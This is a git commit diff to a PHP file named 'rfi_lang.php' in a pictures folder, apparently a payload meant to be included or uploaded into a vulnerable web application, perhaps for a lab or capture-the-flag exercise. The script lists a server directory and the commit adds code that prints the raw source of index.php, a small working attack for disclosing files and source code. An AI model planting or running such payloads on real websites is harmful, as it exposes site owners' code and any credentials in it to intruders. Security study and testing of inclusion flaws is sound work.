faf7af314b4f218cc36f6595658c81a7f39c0f00
ACHERIR M. AREZKI <39704385+MohandAcherir@users.noreply.github.com>
2024-12-10 08:21:34 -0500

    Update rfi_lang.php

--- pictures/rfi_lang.php
+++ pictures/rfi_lang.php
@@ -9,6 +9,15 @@ while ($file = readdir($dir)) {
     echo "\n";
 }
 closedir($dir);
-$file_content = file_get_contents('./index.php');
+$file_content = file_get_contents('index.php');
 echo $file_content;
+
+$file = fopen('index.php', 'r');
+if ($file) {
+    $file_content = fread($file, filesize('index.php'));
+    echo $file_content;
+    fclose($file);
+} else {
+    echo "Error opening the file.";
+}
 ?>
